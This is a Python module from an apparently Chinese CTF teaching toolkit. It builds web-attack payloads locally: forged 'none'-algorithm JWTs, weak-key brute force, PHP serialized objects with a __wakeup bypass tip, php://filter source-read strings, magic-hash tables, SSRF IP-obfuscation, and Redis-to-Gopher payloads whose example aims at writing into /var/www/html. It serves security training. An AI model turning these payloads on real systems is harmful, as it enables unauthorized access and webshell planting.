"""Web 辅助工具（教材第 4 章）：JWT、PHP 序列化、php://filter、弱类型速查、SSRF/Gopher、HTTP 解析。

这些都是本地计算，不向任何网站发请求。对目标发请求的操作（扫描、注入、SQLMap）只在 Docker 环境中针对自己的靶场进行。
"""

import base64
import hashlib
import hmac
import json
import re
from urllib.parse import quote, unquote

from ..registry import ToolError, field, text_input, tool
from ..util import fields, show, table

# ---------------------------------------------------------------- JWT


def b64url_decode(s):
    s = s.strip().rstrip("=")
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def b64url_encode(data):
    return base64.urlsafe_b64encode(data).decode().rstrip("=")


@tool(
    "web.jwt", "JWT 解析与伪造", "web", "4",
    summary="解析 JWT，支持 none 算法伪造、弱密钥爆破、用已知密钥重新签名",
    principle="""
    JWT（JSON Web Token）由三段用 `.` 连接的 Base64URL 组成：`头部.载荷.签名`。
    头部和载荷是明文（只是 Base64，不是加密），签名用来防篡改。常见漏洞：

    | 漏洞 | 做法 |
    |---|---|
    | 信息泄露 | 载荷里直接能看到用户名、角色等（Base64 解开即可） |
    | `alg: none` | 把算法改成 `none`、去掉签名，服务器若接受就能任意伪造 |
    | 弱密钥 | HS256 的密钥是弱口令时，用字典爆破出密钥后重新签名 |
    | 算法混淆 | 把 RS256 改成 HS256，用公钥当作 HMAC 密钥（需要公钥，这里不自动做） |

    修改载荷（如把 `admin` 改成 `true`）后，用正确的密钥重新签名即可。
    """,
    inputs=[text_input("JWT", placeholder="eyJ...")],
    options=[field("action", "select", "操作", default="解析",
                   choices=["解析", "伪造 none 算法", "弱密钥爆破（HS256）", "用密钥重新签名"]),
             field("payload", "text", "新载荷（JSON，留空保持原样）", default="",
                   visible_when={"action": ["伪造 none 算法", "用密钥重新签名"]}),
             field("key", "string", "密钥", default="", visible_when={"action": "用密钥重新签名"}),
             field("words", "text", "字典（每行一个）", default="")],
    examples=[{"text": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJhZG1pbiI6ZmFsc2V9.JvRgLfCrpBHNvY1Y3YBhqFTz3f7xVQFT9bHd9ZFGDuY"}],
    keywords=["jwt", "json web token", "none", "hs256", "伪造"],
    live=False,
)
def jwt_tool(text, action="解析", payload="", key="", words=""):
    parts = text.strip().split(".")
    if len(parts) < 2:
        raise ToolError("JWT 应由两到三段用 . 连接的内容组成")
    try:
        header = json.loads(b64url_decode(parts[0]))
        body = json.loads(b64url_decode(parts[1]))
    except Exception as e:
        raise ToolError("头部或载荷不是有效的 JSON：%s" % e)
    if action == "解析":
        return fields([["头部", json.dumps(header, ensure_ascii=False)],
                       ["载荷", json.dumps(body, ensure_ascii=False, indent=2)],
                       ["算法", header.get("alg", "?")], ["签名（Base64URL）", parts[2] if len(parts) > 2 else "无"]])
    new_body = body
    if payload.strip():
        try:
            new_body = json.loads(payload)
        except json.JSONDecodeError as e:
            raise ToolError("新载荷不是有效的 JSON：%s" % e)
    if action == "伪造 none 算法":
        h = b64url_encode(json.dumps({"alg": "none", "typ": "JWT"}, separators=(",", ":")).encode())
        p = b64url_encode(json.dumps(new_body, separators=(",", ":")).encode())
        return fields([["伪造的 JWT（none 算法）", "%s.%s." % (h, p)], ["说明", "签名为空，服务器若接受 none 算法即可生效"]])
    if action == "用密钥重新签名":
        if not key:
            raise ToolError("请填写密钥")
        signing = "%s.%s" % (parts[0], b64url_encode(json.dumps(new_body, separators=(",", ":")).encode())) \
            if payload.strip() else "%s.%s" % (parts[0], parts[1])
        sig = hmac.new(key.encode(), signing.encode(), hashlib.sha256).digest()
        return fields([["重新签名的 JWT", "%s.%s" % (signing, b64url_encode(sig))]])
    # 弱密钥爆破
    if len(parts) < 3:
        raise ToolError("没有签名，无法爆破密钥")
    signing = "%s.%s" % (parts[0], parts[1])
    target = parts[2]
    candidates = [w.strip() for w in words.splitlines() if w.strip()] or \
        ["secret", "123456", "password", "key", "admin", "jwt", "test", "flag", "qwerty", "666666", "1234567890",
         "secretkey", "your-256-bit-secret", "s3cr3t", "changeme", "root", "123", "abc123"]
    for pw in candidates:
        sig = b64url_encode(hmac.new(pw.encode(), signing.encode(), hashlib.sha256).digest())
        if sig == target:
            return fields([["找到密钥", pw], ["说明", "现在可以在“用密钥重新签名”中用它伪造任意载荷"]])
    return "尝试的 %d 个密钥都不对。可以提供更大的字典，或在 Docker 中用 jwt_tool / hashcat（模式 16500）。" % len(candidates)


# ---------------------------------------------------------------- PHP 序列化

def php_parse(s, i=0):
    """解析 PHP 序列化字符串，返回 (值的可读描述, 下一个位置)。"""
    t = s[i]
    if t == "N":
        return "NULL", i + 2
    if t in "bis":
        if t == "s":
            m = re.match(r's:(\d+):"', s[i:])
            ln = int(m.group(1))
            start = i + m.end()
            val = s[start:start + ln]
            return '"%s"' % val, start + ln + 2
        m = re.match(r'[bis]:([^;]+);', s[i:])
        return m.group(1), i + m.end()
    if t == "d":
        m = re.match(r'd:([^;]+);', s[i:])
        return m.group(1), i + m.end()
    if t in "aO":
        if t == "O":
            m = re.match(r'O:(\d+):"([^"]*)":(\d+):\{', s[i:])
            name, n = m.group(2), int(m.group(3))
            prefix = "对象 %s {" % name
        else:
            m = re.match(r'a:(\d+):\{', s[i:])
            n = int(m.group(1))
            prefix = "数组 {"
        j = i + m.end()
        items = []
        for _ in range(n):
            k, j = php_parse(s, j)
            v, j = php_parse(s, j)
            items.append("%s => %s" % (k, v))
        return prefix + "; ".join(items) + "}", j + 1
    raise ToolError("无法解析的类型 '%s'（位置 %d）" % (t, i))


def php_serialize_value(v):
    if isinstance(v, bool):
        return "b:%d;" % v
    if isinstance(v, int):
        return "i:%d;" % v
    if isinstance(v, float):
        return "d:%s;" % v
    if v is None:
        return "N;"
    if isinstance(v, str):
        b = v.encode("utf-8")
        return 's:%d:"%s";' % (len(b), v)
    if isinstance(v, list):
        inner = "".join(php_serialize_value(i) + php_serialize_value(x) for i, x in enumerate(v))
        return "a:%d:{%s}" % (len(v), inner)
    if isinstance(v, dict):
        inner = "".join(php_serialize_value(k) + php_serialize_value(val) for k, val in v.items())
        return "a:%d:{%s}" % (len(v), inner)
    raise ToolError("不支持的类型")


@tool(
    "web.php_serialize", "PHP 序列化", "web", "4",
    summary="解析 PHP 序列化字符串，或把 JSON 转成序列化串（反序列化题构造 payload）",
    principle="""
    PHP 的 `serialize()` 把变量变成字符串，`unserialize()` 还原。格式一看就懂：

    - `s:5:"admin"`：长度为 5 的字符串；
    - `i:1`：整数；`b:1`：布尔真；`N`：null；
    - `a:2:{...}`：有 2 个元素的数组；
    - `O:4:"User":2:{...}`：User 类的对象，有 2 个属性。

    **反序列化漏洞**：如果程序把用户可控的数据传给 `unserialize()`，又恰好有危险的魔术方法
    （`__wakeup`、`__destruct`），就能构造特定对象触发利用（POP 链）。

    **常见技巧**：`__wakeup` 绕过——把对象的属性个数改得比实际大（如 `O:4:"User":3` 实际只写 2 个），
    某些 PHP 版本会跳过 `__wakeup`。字符串长度改了内容后要同步改数字。
    """,
    inputs=[text_input("输入", placeholder='O:4:"User":2:{s:4:"name";s:5:"guest";s:5:"admin";b:0;}')],
    options=[field("action", "segmented", "操作", default="解析", choices=["解析", "JSON → 序列化"])],
    examples=[{"text": 'a:2:{s:4:"name";s:5:"guest";s:5:"admin";b:0;}', "action": "解析"},
              {"text": '{"name": "admin", "admin": true}', "action": "JSON → 序列化"}],
    keywords=["php", "序列化", "serialize", "反序列化", "pop"],
    live=False,
)
def php_serialize_tool(text, action="解析"):
    if action == "JSON → 序列化":
        try:
            v = json.loads(text)
        except json.JSONDecodeError as e:
            raise ToolError("不是有效的 JSON：%s" % e)
        return php_serialize_value(v)
    try:
        desc, end = php_parse(text.strip())
    except (AttributeError, IndexError, ValueError) as e:
        raise ToolError("解析失败，检查格式是否完整：%s" % e)
    return fields([["结构", desc], ["总长度", len(text.strip())],
                   ["提示", "改了字符串内容记得同步改前面的长度数字"]])


# ---------------------------------------------------------------- php://filter

@tool(
    "web.php_filter", "php://filter 构造", "web", "4.6",
    summary="构造文件包含用的 php://filter 读取源码；解码 base64 过滤器的结果",
    principle="""
    文件包含漏洞中，`php://filter` 可以在包含文件时对内容做转换。最常见的用法是读取 PHP 源码：

    ```
    php://filter/convert.base64-encode/resource=index.php
    ```

    PHP 文件被包含时本会执行，加上 `convert.base64-encode` 后变成输出它的 Base64，
    这样就能拿到源码而不执行它。解码得到的 Base64 就是源码。

    其他过滤器：`convert.iconv.<from>.<to>`（编码转换，可用于绕过）、`string.rot13`、`zlib.deflate`（配合 phar）。
    还有一种“filter 链”技巧（用 iconv 一步步拼出任意字符），较复杂，这里只给出最常用的读源码构造。
    """,
    inputs=[field("text", "string", "文件名 / 要解码的 Base64", default="index.php")],
    options=[field("action", "segmented", "操作", default="构造读源码", choices=["构造读源码", "解码 Base64 结果"]),
             field("filter", "select", "过滤器", default="convert.base64-encode",
                   choices=["convert.base64-encode", "string.rot13", "convert.iconv.utf-8.utf-16"],
                   visible_when={"action": "构造读源码"})],
    examples=[{"text": "config.php", "action": "构造读源码"}],
    keywords=["php", "filter", "文件包含", "lfi", "base64", "源码"],
)
def php_filter_tool(text, action="构造读源码", filter="convert.base64-encode"):
    if action == "构造读源码":
        payload = "php://filter/%s/resource=%s" % (filter, text.strip())
        return fields([["payload", payload], ["URL 编码", quote(payload, safe="")],
                       ["说明", "作为文件包含参数提交，返回内容再用本工具“解码 Base64 结果”"]])
    try:
        data = base64.b64decode(re.sub(r"\s", "", text) + "=" * (-len(re.sub(r"\s", "", text)) % 4))
    except Exception:
        raise ToolError("不是有效的 Base64")
    return show(data)


# ---------------------------------------------------------------- 弱类型速查

WEAK_TYPE = [
    ['0 == "abc"', "true（PHP 7）", "false（PHP 8）", "PHP 7 把字符串转成数字 0；PHP 8 改为把 0 转成 \"0\""],
    ['"1" == "01"', "true", "true", "两个数字字符串按数值比较"],
    ['"10" == "1e1"', "true", "true", "1e1 是科学计数法 = 10"],
    ['"0e123" == "0e456"', "true", "true", "两边都是 0 的若干次方 = 0（0e 开头的哈希碰撞）"],
    ['"abc" == 0', "true（PHP 7）", "false（PHP 8）", "同第一行"],
    ['null == false', "true", "true", "都转成 false"],
    ['null == 0', "true", "true", "都转成 0"],
    ['[] == false', "true", "true", "空数组转成 false"],
    ['"abc" == "ABC"', "false", "false", "都不是数字字符串，按字符串比较"],
    ['"1abc" == 1', "true（PHP 7）", "false（PHP 8）", "PHP 7 从字符串开头取数字 1"],
    ['md5([]) 比较', "NULL == NULL → true（PHP 7）", "TypeError（PHP 8）", "数组传入 md5，PHP 7 返回 NULL，PHP 8 报错"],
    ['strcmp([], "x")', "NULL → 可绕过（旧版）", "TypeError", "数组传入 strcmp，旧版返回 NULL == 0"],
]

MAGIC_HASHES = [
    ["md5", "240610708", "0e462097431906509019562988736854"],
    ["md5", "QNKCDZO", "0e830400451993494058024219903391"],
    ["md5", "aabg7XSs", "0e087386482136013740957780965295"],
    ["sha1", "aaroZmOk", "0e66507019969427134894567494305185566735"],
    ["sha1", "aaK1STfY", "0e76658526655756207688271159624026011393"],
    ["sha256", "34250003024812", "0e46289032038065916139621039085883773413820991920706299695051332"],
]


@tool(
    "web.weaktype", "PHP 弱类型速查", "web", "4.3",
    summary="== 比较规则速查（区分 PHP 7 / 8）、0e 开头的魔术哈希、绕过技巧",
    principle="""
    PHP 的 `==`（松散比较）会先转换类型，带来很多违反直觉的结果。**PHP 8 改变了数字与非数字字符串的比较规则**，
    同一道题在不同版本结果可能不同（看响应头 `X-Powered-By` 判断版本）。

    常见绕过：
    - `md5($a) == md5($b)` 且 `$a != $b`：找两个 `0e` + 纯数字的哈希（下表）；或传数组 `a[]=1&b[]=2`（PHP 7 下 md5 返回 NULL）；
    - `strcmp($pass, $input) == 0`：传数组让 strcmp 返回 NULL（旧版）；
    - `=== ` 严格比较无法用上述方法绕过，要改用其他思路。
    """,
    inputs=[field("text", "string", "查询（可选，过滤下表）", default="")],
    options=[field("view", "segmented", "查看", default="比较规则", choices=["比较规则", "魔术哈希（0e）"])],
    examples=[{"view": "比较规则"}],
    keywords=["php", "弱类型", "==", "0e", "md5", "strcmp", "magic hash"],
)
def weaktype_tool(text="", view="比较规则"):
    if view == "魔术哈希（0e）":
        rows = [r for r in MAGIC_HASHES if not text or text.lower() in r[0]]
        return [fields([["说明", "这些字符串的哈希是 0e 开头且其余全是数字，在 == 比较中都等于 0"]]),
                table(["算法", "原文", "哈希（0e 开头）"], rows)]
    rows = [r for r in WEAK_TYPE if not text or text.lower() in r[0].lower() or text in r[3]]
    return table(["表达式", "PHP 7", "PHP 8", "说明"], rows)


# ---------------------------------------------------------------- SSRF / Gopher

@tool(
    "web.ssrf", "SSRF 工具", "web", "4.9",
    summary="IP 地址的多种写法转换；构造 Gopher 协议的 Redis 命令",
    principle="""
    SSRF（服务端请求伪造）让服务器去访问攻击者指定的地址。两个常用技巧：

    **IP 绕过**：过滤器常检查 `127.0.0.1`，但同一个地址有很多写法，可绕过黑名单：
    十进制 `2130706433`、十六进制 `0x7f000001`、八进制 `0177.0.0.1`、`127.1` 等。

    **Gopher 协议**：`gopher://` 可以发送任意 TCP 数据，常用来攻击内网的 Redis、MySQL 等。
    例如让 Redis 写一个计划任务或 webshell。本工具可以把 Redis 命令转成 Gopher payload。
    """,
    inputs=[field("text", "string", "IP 或 Redis 命令", default="127.0.0.1")],
    options=[field("action", "segmented", "操作", default="IP 写法转换", choices=["IP 写法转换", "Redis → Gopher"]),
             field("host", "string", "目标", default="127.0.0.1:6379", visible_when={"action": "Redis → Gopher"})],
    examples=[{"text": "127.0.0.1", "action": "IP 写法转换"},
              {"text": "set x 1\nconfig set dir /var/www/html", "action": "Redis → Gopher", "host": "127.0.0.1:6379"}],
    keywords=["ssrf", "gopher", "redis", "ip", "绕过"],
)
def ssrf_tool(text, action="IP 写法转换", host="127.0.0.1:6379"):
    if action == "IP 写法转换":
        m = re.match(r"(\d+)\.(\d+)\.(\d+)\.(\d+)", text.strip())
        if not m:
            raise ToolError("请输入点分十进制 IP，如 127.0.0.1")
        parts = [int(x) for x in m.groups()]
        if any(p > 255 for p in parts):
            raise ToolError("每段应在 0～255")
        n = parts[0] << 24 | parts[1] << 16 | parts[2] << 8 | parts[3]
        return fields([["点分十进制", text.strip()], ["十进制整数", str(n)], ["十六进制", "0x%x" % n],
                       ["八进制", "0%o.0%o.0%o.0%o" % tuple(parts)], ["混合 / 省略", "%d.%d" % (parts[0], n & 0xFFFFFF)],
                       ["带 http", "http://%d/" % n]])
    # Redis → Gopher
    lines = [l for l in text.splitlines() if l.strip()]
    body = ""
    for line in lines:
        args = line.split()
        body += "*%d\r\n" % len(args) + "".join("$%d\r\n%s\r\n" % (len(a), a) for a in args)
    data = quote(body, safe="")
    return fields([["Gopher payload", "gopher://%s/_%s" % (host, data)],
                   ["说明", "作为 SSRF 的 url 参数提交；若经过一层 URL 解析需再编码一次"]])


# ---------------------------------------------------------------- HTTP 解析

@tool(
    "web.http", "HTTP 报文解析", "web", "4.0.1",
    summary="解析原始 HTTP 请求 / 响应，拆出请求行、头部、参数、Cookie；生成 curl 与 Python 代码",
    principle="""
    把拦截到的原始 HTTP 请求粘进来，拆解成各个部分，方便查看和改写：请求方法、路径、查询参数、
    请求头、Cookie、请求体。还能一键生成 `curl` 命令和 Python `requests` 代码，用于在 Docker 环境中重放。
    """,
    inputs=[text_input("原始 HTTP 报文", placeholder="GET /?id=1 HTTP/1.1\nHost: example.com\nCookie: session=abc")],
    options=[field("output", "segmented", "输出", default="解析", choices=["解析", "curl", "Python requests"])],
    examples=[{"text": "POST /login HTTP/1.1\nHost: example.com\nContent-Type: application/x-www-form-urlencoded\nCookie: PHPSESSID=abc123\n\nuser=admin&pass=123"}],
    keywords=["http", "请求", "curl", "requests", "报文"],
)
def http_tool(text, output="解析"):
    lines = text.replace("\r\n", "\n").split("\n")
    if not lines or " " not in lines[0]:
        raise ToolError("第一行应为请求行，如 GET /path HTTP/1.1")
    parts = lines[0].split()
    method, path = parts[0], parts[1] if len(parts) > 1 else "/"
    headers, i = {}, 1
    while i < len(lines) and lines[i].strip():
        if ":" in lines[i]:
            k, v = lines[i].split(":", 1)
            headers[k.strip()] = v.strip()
        i += 1
    body = "\n".join(lines[i + 1:]) if i < len(lines) else ""
    host = headers.get("Host", "example.com")
    scheme = "https"
    url = "%s://%s%s" % (scheme, host, path)
    if output == "解析":
        rows = [["方法", method], ["URL", url], ["路径", path.split("?")[0]]]
        if "?" in path:
            for pair in path.split("?", 1)[1].split("&"):
                kv = pair.split("=", 1)
                rows.append(["查询参数 " + kv[0], unquote(kv[1]) if len(kv) > 1 else ""])
        for k, v in headers.items():
            rows.append(["头 " + k, v])
        if "Cookie" in headers:
            for c in headers["Cookie"].split(";"):
                if "=" in c:
                    k, v = c.split("=", 1)
                    rows.append(["Cookie " + k.strip(), v.strip()])
        if body.strip():
            rows.append(["请求体", body])
        return table(["项目", "值"], rows)
    if output == "curl":
        cmd = "curl -X %s '%s'" % (method, url)
        for k, v in headers.items():
            if k.lower() != "host" or scheme:
                cmd += " \\\n  -H '%s: %s'" % (k, v)
        if body.strip():
            cmd += " \\\n  --data '%s'" % body.strip()
        return {"type": "code", "lang": "bash", "value": cmd}
    code = "import requests\n\nheaders = {\n"
    code += "".join("    %r: %r,\n" % (k, v) for k, v in headers.items() if k.lower() != "host")
    code += "}\n"
    if body.strip():
        code += "data = %r\n" % body.strip()
    code += "r = requests.%s(%r, headers=headers%s)\nprint(r.status_code)\nprint(r.text)\n" % (
        method.lower(), url, ", data=data" if body.strip() else "")
    return {"type": "code", "lang": "python", "value": code}
